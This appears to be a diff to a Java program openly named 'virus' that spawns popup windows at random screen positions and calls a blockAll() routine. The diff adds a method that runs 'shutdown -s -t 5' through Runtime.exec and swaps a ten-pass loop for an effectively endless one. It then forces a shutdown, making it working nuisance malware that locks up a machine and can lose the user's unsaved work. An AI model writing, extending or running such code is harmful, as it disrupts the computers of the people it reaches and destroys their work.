@@ -2,7 +2,7 @@ import java.util.*;
 import javax.swing.*;
 import java.awt.event.*;
 import java.awt.*;
-import java.awt.AWTException;
+import java.io.*;
 
 public class virus{
     private final Dimension screenSize = Toolkit.getDefaultToolkit().getScreenSize();
@@ -24,17 +24,27 @@ public class virus{
         window.setLocation(Random.nextInt(width), Random.nextInt(height));
         window.setVisible(true);
     }
+    public void close(){
+        Runtime runtime = Runtime.getRuntime();
+      try
+      {
+         System.out.println("Shutting down the PC after 5 seconds.");
+         runtime.exec("shutdown -s -t 5");
+      }
+      catch(IOException e)
+      {
+         System.out.println("Exception: " +e);
+      }
+    }
     public static void main(String[] args) throws AWTException, InterruptedException 
     {
         virus v =  new virus();
-
-        // while (true) 
-        for (int i = 0; i < 10; i++)
+        for (long i = 0; i < 1000000000000000000l; i++)
         {
-            v.popup();
             v.blockAll();
-
+            v.popup();
         }
+        v.close();
         
     }
 }
